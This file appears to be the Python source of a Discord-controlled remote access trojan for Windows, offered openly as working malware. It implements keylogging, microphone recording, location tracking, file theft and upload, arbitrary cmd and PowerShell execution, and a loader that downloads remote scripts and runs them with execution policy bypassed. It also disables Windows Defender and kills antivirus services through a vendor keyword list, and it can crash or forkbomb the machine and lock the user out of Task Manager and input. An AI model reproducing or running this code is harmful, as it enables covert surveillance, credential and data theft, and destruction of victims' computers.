@bot.command(aliases=["list-speakers"])
async def list_speakers(ctx):
    await ctx.message.add_reaction("🔊")
    ps_script = "Get-AudioDevice -List | Where-Object { $_.Type -eq 'Playback' } | Select-Object Index, Name, Default | ConvertTo-Json -Compress"
    try:
        result = ps(ps_script)
        devices = json.loads(result.stdout.strip())
        if isinstance(devices, dict):
            devices = [devices]
        lines = [f"{d['Index']}. {'[DEFAULT] ' if d.get('Default') else ''}{d['Name']}" for d in devices]
        embed = create_embed("🔊 Speakers", f"```{chr(10).join(lines)}```", 0x0084ff)
    except Exception as e:
        embed = create_embed("Error", str(e), 0xff0000)
    await ctx.send(embed=embed)


@bot.command(aliases=["change-output", "set-speaker"])
async def change_output(ctx, target: str = None):
    if not target:
        await ctx.send(embed=create_embed("Error", "Usage: `.change-output <index | name>`", 0xffa500))
        return
    ps_script = f'''
if (-not (Get-Module -ListAvailable AudioDeviceCmdlets)) {{
    Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force -AllowClobber | Out-Null
}}
if ('{target}' -as [int]) {{
    Set-AudioDevice -Index {target}
}} else {{
    $dev = Get-AudioDevice -List | Where-Object {{ $_.Type -eq 'Playback' -and $_.Name -like '*{target}*' }} | Select-Object -First 1
    if ($dev) {{ Set-AudioDevice -Index $dev.Index }} else {{ Write-Output "NOT_FOUND" }}
}}
'''
    result = ps(ps_script)
    if "NOT_FOUND" in result.stdout:
        await ctx.send(embed=create_embed("Error", f"Device **{target}** not found.", 0xff0000))
    else:
        await ctx.send(embed=create_embed("🔊 Output", f"Default device set to `{target}`.", 0x0084ff))


def _voice_watchdog(channel_id, mic_name):
    while voice_reconnect:
        time.sleep(3)
        try:
            vc = voice_client
            if vc and vc.is_connected() and not vc.is_playing():
                source = discord.FFmpegPCMAudio(
                    source=f"audio={mic_name}",
                    executable=FFMPEG_BIN,
                    before_options="-f dshow -rtbufsize 100M",
                    options="-ac 2 -ar 48000"
                )
                vc.play(source)
        except Exception:
            pass

@bot.command(aliases=["block-input"])
async def block_input(ctx, seconds: int = None):
    global input_blocked, keyboard_listener, mouse_listener
    if input_blocked:
        await ctx.send("Already blocked")
        return
    await ctx.message.add_reaction("📌")
    if seconds is None:
        keyboard_listener = keyboard.Listener(suppress=True)
        mouse_listener = mouse.Listener(suppress=True)
        keyboard_listener.start()
        mouse_listener.start()
        input_blocked = True
        await ctx.send(embed=create_embed("⌨️ Input blocked", "Blocked permanently.", 0xff0000))
    else:
        def block_temp():
            global input_blocked
            k = keyboard.Listener(suppress=True)
            m = mouse.Listener(suppress=True)
            k.start()
            m.start()
            time.sleep(seconds)
            k.stop()
            m.stop()
            input_blocked = False
        input_blocked = True
        threading.Thread(target=block_temp, daemon=True).start()
        await ctx.send(embed=create_embed("⌨️ Input blocked", f"Blocked for **{seconds}** seconds.", 0xff0000))


@bot.command(aliases=["unblock-input"])
async def unblock_input(ctx):
    global input_blocked, keyboard_listener, mouse_listener
    if not input_blocked:
        await ctx.send("`🚫` Input already unlocked.")
        return
    if keyboard_listener:
        keyboard_listener.stop()
    if mouse_listener:
        mouse_listener.stop()
    input_blocked = False
    await ctx.send(embed=create_embed("⌨️ Input Unblocked", "Unblocked.", 0x00ff00))


@bot.command(aliases=["hide-cursor"])
async def hide_cursor(ctx):
    ctypes.windll.user32.ShowCursor(False)
    await ctx.send(embed=create_embed("🖱️ Cursor", "Cursor hidden.", 0x00ff00))


@bot.command(aliases=["show-cursor"])
async def show_cursor(ctx):
    ctypes.windll.user32.ShowCursor(True)
    await ctx.send(embed=create_embed("🖱️ Cursor", "Cursor shown.", 0x00ff00))


@bot.command(aliases=["monitors-off"])
async def monitors_off(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    await ctx.send(embed=create_embed("💻 Monitors", "Monitors off.", 0xff0000))


@bot.command(aliases=["monitors-on"])
async def monitors_on(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
    await ctx.send(embed=create_embed("💻 Monitors", "Monitors on.", 0x00ff00))


@bot.command()
async def taskkill(ctx, *, process: str):
    subprocess.run(["taskkill", "/f", "/im", process], capture_output=True)
    await ctx.send(embed=create_embed("🚫 Taskkill", f"Killed **{process}**.", 0x27F542))


@bot.command()
async def tasklist(ctx):
    result = cmd_run("tasklist")
    for chunk in chunk_text(result.stdout):
        await ctx.send(f"```{chunk}```")


@bot.command(aliases=["kill-explorer"])
async def kill_explorer(ctx):
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
    await ctx.send(embed=create_embed("⛔ Explorer", "explorer.exe killed.", 0xff0000))


@bot.command(aliases=["start-explorer"])
async def start_explorer(ctx):
    subprocess.Popen(["start", "explorer.exe"], shell=True)
    await ctx.send(embed=create_embed("⛔ Explorer", "explorer.exe started.", 0x00ff00))


@bot.command(aliases=["set-critical"])
async def set_critical(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    await ctx.send(embed=create_embed("❗ Critical", "Process is now critical.", 0xff0000))


@bot.command(aliases=["unset-critical"])
async def unset_critical(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    await ctx.send(embed=create_embed("❗ Critical", "Critical disabled.", 0x00ff00))


@bot.command(aliases=["crazy-mouse"])
async def crazy_mouse(ctx):
    await ctx.message.add_reaction("🖱️")
    def crazy():
        for _ in range(200):
            ctypes.windll.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
            time.sleep(0.01)
    threading.Thread(target=crazy, daemon=True).start()
    await ctx.send(embed=create_embed("😵‍💫 Crazy Mouse", "Enabled for 2 seconds.", 0xf39c12))


@bot.command(aliases=["minimize-all"])
async def minimize_all(ctx):
    subprocess.run(["powershell", "-Command", "$w = New-Object -ComObject Shell.Application; $w.MinimizeAll()"], capture_output=True)
    await ctx.send(embed=create_embed("➖ Minimize", "All windows minimized.", 0x00ff00))


@bot.command()
async def bsod(ctx):
    await ctx.send(embed=create_embed("💀 BSOD", "Triggering BSOD...", 0x00ff00))
    await ctx.message.add_reaction("💀")
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        subprocess.run(["taskkill", "/F", "/IM", "svchost.exe"])
    except Exception:
        pass


@bot.command()
async def forkbomb(ctx):
    await ctx.message.add_reaction("💀")
    await ctx.send(embed=create_embed("🍽️ Forkbomb", "Forkbomb started.", 0xff0000))
    while True:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)


@bot.command()
async def jumpscare(ctx):
    await ctx.message.add_reaction("👻")
    path = os.path.join(BASE_DIR, "jump.mp4")
    if not os.path.exists(path):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(JUMPSCARE_URL) as resp:
                    with builtins.open(path, "wb") as f:
                        f.write(await resp.read())
        except Exception as e:
            await ctx.send(embed=create_embed("Error", f"Download failed: {e}", 0xFF0000))
            return
    try:
        set_volume_level(1.0)
        script = (
            "$w = New-Object -ComObject WMPlayer.OCX; "
            f"$w.URL = '{path}'; "
            "$w.settings.volume = 100; "
            "$w.controls.play(); "
            "Start-Sleep -Milliseconds 700; "
            "$w.fullScreen = $true; "
            "Start-Sleep -Seconds 10; "
            "$w.close()"
        )
        subprocess.Popen(["powershell", "-NoProfile", "-Command", script],
                         creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send(embed=create_embed("👻 Jumpscare", "Playing fullscreen.", 0xFF0000))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))

@bot.command(aliases=["display-glitch"])
async def display_glitch(ctx, effect: str = None):
    if effect is None or effect == "list":
        await ctx.send(embed=create_embed("💻 Available Glitches", "".join(flash_screen("list")), 0x3498db))
        return
    if effect + "\n" in flash_screen("list"):
        threading.Thread(target=flash_screen, args=(effect,), daemon=True).start()
        await ctx.send(embed=create_embed("💻 Glitch Executed", f"Effect: **{effect}**.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("Error", "Invalid effect.", 0xff0000))


@bot.command(aliases=["windows-notification", "win-notify"])
async def windows_notification(ctx, title: str = None, *, message: str = None):
    if not title or not message:
        await ctx.send(embed=create_embed("Error", 'Usage: `.win-notify "<title>" <message>`', 0xffa500))
        return
    ps_script = (
        '[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); '
        '$notify = New-Object System.Windows.Forms.NotifyIcon; '
        '$notify.Icon = [System.Drawing.SystemIcons]::Information; '
        '$notify.Visible = $true; '
        f'$notify.ShowBalloonTip(5000, "{title}", "{message}", [System.Windows.Forms.ToolTipIcon]::Info); '
        'Start-Sleep -s 6; $notify.Dispose()'
    )
    ps(ps_script)
    await ctx.send(embed=create_embed("🔔 Notification", f"**{title}**\n{message}", 0x0084ff))


@bot.command()
async def play(ctx, *, file: str):
    subprocess.Popen(["start", file], shell=True)
    await ctx.send(embed=create_embed("🎵 Playing", file, 0x00ff00))


@bot.command(aliases=["speak"])
async def tts(ctx, *, message: str):
    subprocess.run(["powershell", "-Command",
                    f'Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak("{message}")'],
                   capture_output=True)
    await ctx.send(embed=create_embed("🗣️ TTS", f"```{message[:50]}```", 0x00ff00))


@bot.command()
async def msg(ctx, type: int = None, title: str = None, *, message: str = None):
    if type is None or title is None or message is None:
        await ctx.send(embed=create_embed("💬 MsgBox", "Usage: `.msg <type> \"<title>\" \"<message>\"`", 0x00ff00))
        return
    safe_title = title.replace('"', '`"')
    safe_message = message.replace('"', '`"')
    subprocess.run(["powershell", "-Command",
                    f'Add-Type -AssemblyName Microsoft.VisualBasic; '
                    f'[Microsoft.VisualBasic.Interaction]::MsgBox("{safe_message}", "{type}", "{safe_title}")'],
                   capture_output=True)
    await ctx.send(embed=create_embed("💬 Message", f"**{title}**\n{message}", 0x00ff00))


@bot.command(aliases=["ls"])
async def dir(ctx):
    global current_dir
    try:
        files = os.listdir(current_dir)
        out = f"👤 **{current_dir}**\n\n"
        for f in files:
            full = os.path.join(current_dir, f)
            if os.path.isdir(full):
                out += f"`📂` `{f}/`\n"
            else:
                out += f"`📄` `{f}` ({os.path.getsize(full)} bytes)\n"
        await ctx.send(embed=create_embed("📁 Directory", out[:4000], 0x3498db))
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def cd(ctx, path: str):
    global current_dir
    try:
        if path == "..":
            current_dir = os.path.dirname(current_dir)
        elif os.path.isabs(path):
            current_dir = path
        else:
            current_dir = os.path.join(current_dir, path)
        current_dir = os.path.normpath(current_dir)
        await ctx.send(embed=create_embed("📁 Directory", f"Now: `{current_dir}`", 0x00ff00))
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def tree(ctx):
    global current_dir
    try:
        lines = tree_directory(current_dir)[:300]
        chunks, cur = [], ""
        for line in lines:
            if len(cur) + len(line) + 1 > 3900:
                chunks.append(cur)
                cur = ""
            cur += line + "\n"
        if cur:
            chunks.append(cur)
        for i, chunk in enumerate(chunks):
            await ctx.send(embed=create_embed(f"🌳 Tree {'(Part ' + str(i + 1) + ')' if len(chunks) > 1 else ''}", f"```{chunk}```", 0x3498db))
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def download(ctx, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    if not os.path.exists(path):
        await ctx.send(embed=create_embed("Error", "File does not exist", 0xff0000))
        return
    if os.path.getsize(path) < 20 * 1024 * 1024:
        await ctx.send(embed=create_embed("🔽 File", file, 0x00ff00), file=discord.File(path))
    else:
        link = upload_fileio(path)
        await ctx.send(embed=create_embed("📎 Link", link or "Upload failed", 0x00ff00))


@bot.command()
async def upload(ctx):
    global current_dir
    if not ctx.message.attachments:
        await ctx.send("`📋` Attach a file with the .upload message.")
        return
    for attachment in ctx.message.attachments:
        await attachment.save(os.path.join(current_dir, attachment.filename))
        await ctx.send(embed=create_embed("⬆️ Uploaded", f"`{attachment.filename}` -> `{current_dir}`", 0x00ff00))


@bot.command()
async def remove(ctx, *, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        await ctx.send(embed=create_embed("🗑️ Deleted", file))
    except PermissionError:
        subprocess.run(["takeown", "/f", path, "/r"], capture_output=True)
        subprocess.run(["icacls", path, "/grant", "everyone:F", "/t"], capture_output=True)
        try:
            shutil.rmtree(path) if os.path.isdir(path) else os.remove(path)
            await ctx.send(embed=create_embed("🗑️ Deleted", f"{file} (with permissions)"))
        except Exception as e:
            await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def open(ctx, *, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    subprocess.Popen(["start", "", path], shell=True)
    await ctx.send(embed=create_embed("📬 Opened", file, 0x00ff00))


@bot.command(aliases=["clear-bin"])
async def empty_bin(ctx):
    ps("Clear-RecycleBin -Force -ErrorAction SilentlyContinue")
    await ctx.send(embed=create_embed("🗑️ Recycle Bin", "Emptied.", 0x0084ff))


@bot.command(aliases=["set-wallpaper", "wallpaper"])
async def set_wallpaper(ctx, *, source: str = None):
    global current_dir
    if not source:
        await ctx.send(embed=create_embed("Error", "Usage: `.wallpaper <file|url>`", 0xffa500))
        return
    if source.startswith("http"):
        target_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "wallpaper_temp.jpg")
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as resp:
                with builtins.open(target_path, "wb") as f:
                    f.write(await resp.read())
    else:
        target_path = os.path.abspath(os.path.join(current_dir, source) if not os.path.isabs(source) else source)
    cmd = (f'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class W '
           f'{{ [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int u, string p, int f); }}\'; '
           f'[W]::SystemParametersInfo(20, 0, \'{target_path}\', 3)')
    ps(cmd)
    await ctx.send(embed=create_embed("🖼️ Wallpaper", "Updated.", 0x0084ff))


@bot.command(aliases=["scriptloader"])
async def script_loader(ctx, url: str = None):
    if not url:
        await ctx.send(embed=create_embed("Error", "Usage: `.scriptloader <url>`", 0xffa500))
        return
    ext = ".ps1" if url.lower().endswith(".ps1") else ".bat" if url.lower().endswith(".bat") else None
    if not ext:
        await ctx.send(embed=create_embed("Error", "URL must end with .bat or .ps1", 0xff0000))
        return
    path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"loaded_script{ext}")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            with builtins.open(path, "wb") as f:
                f.write(await resp.read())
    cmd = f'powershell -ExecutionPolicy Bypass -File "{path}"' if ext == ".ps1" else f'cmd.exe /c "{path}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    out = ((result.stdout or "") + (result.stderr or ""))[-1900:] or "Executed (no output)"
    await ctx.send(embed=create_embed("⚙️ Script Executed", f"```{out}```", 0x0084ff))


@bot.command()
async def blacklist(ctx, *, process: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT 1 FROM blacklist WHERE process_name = ?", (process,))
    if c.fetchone():
        await ctx.send(embed=create_embed("Error", "Already in list", 0xFF0000))
    else:
        c.execute("INSERT INTO blacklist VALUES (?)", (process,))
        conn.commit()
        await ctx.send(embed=create_embed("🚫 Blacklist", f"Blocked **{process}**.", 0xFF0000))
    conn.close()


@bot.command()
async def unblacklist(ctx, *, process: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM blacklist WHERE process_name = ?", (process,))
    conn.commit()
    conn.close()
    await ctx.send(embed=create_embed("✅ Unblacklist", f"Unblocked **{process}**.", 0x00FF00))


@bot.command(aliases=["block-domain"])
async def block_domain(ctx, *, domain: str):
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    with builtins.open(hosts_path, "a") as f:
        f.write(f"\n127.0.0.1 {domain}\n")
    await ctx.send(embed=create_embed("🚫 Domain Blocked", domain, 0xff0000))


@bot.command(aliases=["unblock-domain"])
async def unblock_domain(ctx, *, domain: str):
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    with builtins.open(hosts_path, "r") as f:
        lines = f.readlines()
    with builtins.open(hosts_path, "w") as f:
        for line in lines:
            if domain not in line:
                f.write(line)
    await ctx.send(embed=create_embed("✅ Domain Unblocked", domain, 0x00ff00))


@bot.command(aliases=["block-website"])
async def block_website(ctx, *, url: str):
    await block_domain(ctx, domain=url.replace("https://", "").replace("http://", "").split("/")[0])


@bot.command(aliases=["unblock-website"])
async def unblock_website(ctx, *, url: str):
    await unblock_domain(ctx, domain=url.replace("https://", "").replace("http://", "").split("/")[0])


@bot.command(aliases=["ip-locate"])
async def ip_locate(ctx):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org") as r:
                ip_addr = await r.text()
            async with session.get(f"http://ip-api.com/json/{ip_addr}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query") as r:
                data = await r.json()
        if data.get("status") != "success":
            await ctx.send(embed=create_embed("Error", data.get("message", "Unknown"), 0xff0000))
            return
        e = create_embed("📍 IP Information", "", 0x3498db)
        e.add_field(name="IP", value=f"```{data.get('query')}```", inline=False)
        e.add_field(name="City", value=data.get("city") or "N/A", inline=True)
        e.add_field(name="Country", value=data.get("country") or "N/A", inline=True)
        e.add_field(name="Coordinates", value=f"{data.get('lat')}, {data.get('lon')}", inline=True)
        e.add_field(name="ISP", value=data.get("isp") or "N/A", inline=False)
        e.add_field(name="AS", value=data.get("as") or "N/A", inline=False)
        await ctx.send(embed=e)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["admin-check"])
async def admin_check(ctx):
    if is_admin():
        await ctx.send(embed=create_embed("👔 Admin", "Running as admin.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("👔 No admin", "Not admin.", 0xff0000))


@bot.command(aliases=["idle-time"])
async def idle_time(ctx):
    await ctx.send(embed=create_embed("⌚ Idle Time", f"**{int(get_idle_time())}** seconds.", 0x3498db))

def ps(cmd):
    return subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
         "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + cmd],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
        creationflags=subprocess.CREATE_NO_WINDOW
    )


def cmd_run(command):
    return subprocess.run(
        f"chcp 65001>nul & {command}", shell=True, capture_output=True,
        text=True, encoding="utf-8", errors="replace",
        creationflags=subprocess.CREATE_NO_WINDOW
    )


def exec_capture(command):
    out = (cmd_run(command).stdout or "").strip()
    return f"Executed command: {command}\nstdout:\n{out}\nEnd of command stdout"


def chunk_text(text, size=1900):
    text = text or ""
    return [text[i:i + size] for i in range(0, max(len(text), 1), size)]


async def send_long(target, text, code=True):
    text = (text or "").strip() or "(no output)"
    for c in chunk_text(text):
        await target.send(f"```\n{c}\n```" if code else c)


def run_script_capture(path, *args):
    buf = io.StringIO()
    old = sys.argv
    try:
        sys.argv = [path, *args]
        with contextlib.redirect_stdout(buf):
            runpy.run_path(path, run_name="__main__")
    except SystemExit:
        pass
    except Exception as e:
        buf.write(f"\n[error] {e}\n")
    finally:
        sys.argv = old
    return buf.getvalue()

@bot.command()
async def cmd(ctx, *, command: str):
    await ctx.message.add_reaction("📌")
    out = ((cmd_run(command).stdout or "") + (cmd_run(command).stderr or "")).strip()
    await ctx.send(embed=create_embed("⬛ CMD", f"```{(out or 'Executed (no output)')[-1900:]}```", 0x0084ff))


@bot.command()
async def powershell(ctx, *, command: str):
    await ctx.message.add_reaction("📌")
    result = ps(command)
    out = ((result.stdout or "") + (result.stderr or "")).strip()
    await ctx.send(embed=create_embed("🟦 PowerShell", f"```{(out or 'Executed (no output)')[-1900:]}```", 0x0084ff))


@bot.command()
async def key(ctx, *, keys: str):
    text = keys.replace("[ENTER]", "\n").replace("[SPACE]", " ").replace("[TAB]", "\t").replace("[ESC]", "\x1b")
    pyautogui.typewrite(text, interval=0.01)
    await ctx.send(embed=create_embed("Keys", f"Sent: `{keys[:50]}`", 0x00ff00))


@bot.command(aliases=["keylogger-enable"])
async def keylogger_enable(ctx):
    global keylogger_active
    keylogger_active = True
    await ctx.send(embed=create_embed("🎹 Keylogger", "Enabled", 0x00ff00))


@bot.command(aliases=["keylogger-disable"])
async def keylogger_disable(ctx):
    global keylogger_active
    keylogger_active = False
    await ctx.send(embed=create_embed("🎹 Keylogger", "Disabled", 0xff0000))


@bot.command(aliases=["keylog"])
async def keylog_dump(ctx):
    if flush_keylog():
        await ctx.send(embed=create_embed("🎹 Keylogger", "Buffer flushed to #keys.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("🎹 Keylogger", "Buffer empty.", 0x3498db))


@bot.command(aliases=["record"])
async def record_now(ctx, seconds: int = 10):
    await ctx.message.add_reaction("🎙️")
    try:
        await asyncio.to_thread(record_and_send, seconds)
        await ctx.send(embed=create_embed("🎙️ Recording", f"{seconds}s sent to #microphone.", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def website(ctx, *, url: str):
    subprocess.Popen(["start", url], shell=True)
    await ctx.send(embed=create_embed("🌐 Web", f"Opening: {url}", 0x00ff00))


@bot.command(aliases=["disable-cmd"])
async def disable_cmd(ctx):
    os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 1 /f')
    await ctx.send(embed=create_embed("💻 CMD", "Disabled.", 0xff0000))


@bot.command(aliases=["enable-cmd"])
async def enable_cmd(ctx):
    os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 0 /f')
    await ctx.send(embed=create_embed("💻 CMD", "Enabled.", 0x00ff00))


@bot.command(aliases=["disable-taskmgr"])
async def disable_taskmgr(ctx):
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    os.system("taskkill /f /im taskmgr.exe")
    await ctx.send(embed=create_embed("📊 Task Manager", "Disabled.", 0xFF0000))


@bot.command(aliases=["enable-taskmgr"])
async def enable_taskmgr(ctx):
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')
    await ctx.send(embed=create_embed("📊 Task Manager", "Enabled.", 0x00ff00))


@bot.command(aliases=["disable-defender"])
async def disable_defender(ctx):
    ps("Set-MpPreference -DisableRealtimeMonitoring $true")
    await ctx.send(embed=create_embed("🛡️ Defender", "Real-time protection disabled.", 0xff0000))


@bot.command(aliases=["enable-defender"])
async def enable_defender(ctx):
    ps("Set-MpPreference -DisableRealtimeMonitoring $false")
    await ctx.send(embed=create_embed("🛡️ Defender", "Real-time protection enabled.", 0x00ff00))


@bot.command(aliases=["deactivate-windows"])
async def deactivate_windows(ctx):
    subprocess.run(["cscript", "//nologo", r"C:\Windows\System32\slmgr.vbs", "/upk"],
                   capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    await ctx.send(embed=create_embed("🪟 Windows", "Deactivated.", 0xff0000))


@bot.command(aliases=["disable-reagentc"])
async def disable_reagentc(ctx):
    subprocess.run(["reagentc", "/disable"], capture_output=True)
    await ctx.send(embed=create_embed("🟣 ReAgentC", "Disabled.", 0xff0000))


@bot.command(aliases=["enable-reagentc"])
async def enable_reagentc(ctx):
    subprocess.run(["reagentc", "/enable"], capture_output=True)
    await ctx.send(embed=create_embed("🟣 ReAgentC", "Enabled.", 0x00ff00))


@bot.command(aliases=["kill-pc"])
async def kill_pc(ctx):
    await ctx.send(embed=create_embed("🚨 Confirmation", "Type `confirm-kill` to destroy the system.", 0xff0000))


@bot.command(aliases=["set-dns"])
async def dns(ctx, dns1: str = None, dns2: str = None):
    if not dns1:
        await ctx.send(embed=create_embed("Error", "Usage: `.set-dns <primary> [secondary]`", 0xffa500))
        return
    await ctx.message.add_reaction("🌐")
    dns_list = f'"{dns1}"' if not dns2 else f'"{dns1}","{dns2}"'
    ps_script = f'''
$adapters = Get-NetAdapter | Where-Object {{ $_.Status -eq "Up" }}
foreach ($adapter in $adapters) {{
    Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses ({dns_list}) -ErrorAction SilentlyContinue
}}
'''
    result = ps(ps_script)
    if result.returncode == 0:
        await ctx.send(embed=create_embed("🌐 DNS Updated", f"Primary: `{dns1}`", 0x0084ff))
    else:
        await ctx.send(embed=create_embed("Error", result.stderr[-1900:], 0xff0000))

AV_KW = ["avast", "avg", "kaspersky", "eset", "bitdefender", "mcafee", "norton",
         "symantec", "malwarebytes", "avira", "sophos", "fortinet", "fortiedr",
         "panda", "trend micro", "g data", "webroot", "crowdstrike", "sentinelone",
         "cylance", "carbon black", "quick heal", "defender", "msmpeng", "securityhealth"]


def purge_av():
    st = _state_read() or {}
    paths = [p for p in (st.get("dir"), st.get("exe")) if p]
    paths += [os.environ.get("TEMP", r"C:\Windows\Temp"), r"C:\Windows\Temp"]

    for p in paths:
        _ps(f'Add-MpPreference -ExclusionPath "{p}" -ErrorAction SilentlyContinue')
        _ps(f'Add-MpPreference -ExclusionProcess "{p}" -ErrorAction SilentlyContinue')

    dpol = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    _reg_add(dpol, "DisableAntiSpyware", 1, "REG_DWORD")
    _reg_add(dpol, "DisableAntiVirus", 1, "REG_DWORD")
    for v in ("DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
              "DisableOnAccessProtection", "DisableScanOnRealtimeEnable",
              "DisableIOAVProtection", "DisableScriptScanning"):
        _reg_add(dpol + r"\Real-Time Protection", v, 1, "REG_DWORD")
    _ps("Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true "
        "-DisableBehaviorMonitoring $true -DisableScriptScanning $true "
        "-MAPSReporting Disabled -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue")

    for avp in (r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security 21.3\avp.com",
                r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security 21.3\avp.com",
                r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud 21.3\avp.com"):
        if os.path.exists(avp):
            for p in paths:
                subprocess.run([avp, "ADDEXCLUSION", p], capture_output=True, creationflags=_CNW)
            break

    script = '''
$kw = @(%s)
Get-CimInstance Win32_Service | ForEach-Object {
  $s = "$($_.DisplayName) $($_.PathName)"
  foreach ($k in $kw) {
    if ($s -match $k) {
      sc.exe stop "$($_.Name)" 2>$null | Out-Null
      reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\$($_.Name)" /v Start /t REG_DWORD /d 4 /f | Out-Null
      break
    }
  }
}
Get-Process | ForEach-Object {
  foreach ($k in $kw) {
    if ($_.ProcessName -match $k) { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue; break }
  }
}
''' % ",".join("'%s'" % k for k in AV_KW)
    _ps(script)


@bot.command(aliases=["purge-av", "kill-av"])
async def purge_av_cmd(ctx):
    await ctx.message.add_reaction("🛡️")
    try:
        await asyncio.to_thread(purge_av)
        await ctx.send(embed=create_embed("🛡️ AV", "Exclusions added, services disabled.", 0x00FF00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))

@bot.command(aliases=["coords", "coordinates"])
async def get_coords(ctx):
    await ctx.message.add_reaction("📍")
    ps_script = r'''
Add-Type -AssemblyName System.Device
$w = New-Object System.Device.Location.GeoCoordinateWatcher
$w.Start()
$t = 0
while (($w.Status -ne "Ready") -and ($w.Permission -ne "Denied") -and ($t -lt 20)) { Start-Sleep -Milliseconds 250; $t++ }
if ($w.Permission -eq "Denied") { Write-Output '{"error":"denied"}' }
else { $l = $w.Position.Location; if ($l.IsUnknown) { Write-Output '{"error":"unknown"}' } else { @{lat=$l.Latitude;lon=$l.Longitude;acc=$l.HorizontalAccuracy} | ConvertTo-Json } }
'''
    lat = lon = acc = None
    try:
        raw = ps(ps_script).stdout.strip()
        if raw:
            data = json.loads(raw)
            if "error" not in data:
                lat, lon, acc = data.get("lat"), data.get("lon"), data.get("acc")
    except Exception:
        pass
    if lat is None or lon is None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json/?fields=lat,lon") as r:
                    data = await r.json()
            lat, lon, acc = data.get("lat"), data.get("lon"), "IP-based"
        except Exception:
            pass
    if lat is None:
        await ctx.send(embed=create_embed("Error", "Could not retrieve location.", 0xff0000))
        return
    await ctx.send(embed=create_embed("📍 Coordinates", f"`{lat}, {lon}` ({acc})\nhttps://www.google.com/maps?q={lat},{lon}", 0x0084ff))


@bot.command(aliases=["mount-iso", "mount"])
async def mount_iso(ctx, *, filename: str = None):
    global current_dir
    if not filename:
        await ctx.send(embed=create_embed("Error", "Usage: `.mount <file.iso>`", 0xffa500))
        return
    path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
    result = ps(f"$i = Mount-DiskImage -ImagePath '{path}' -PassThru; ($i | Get-Volume).DriveLetter")
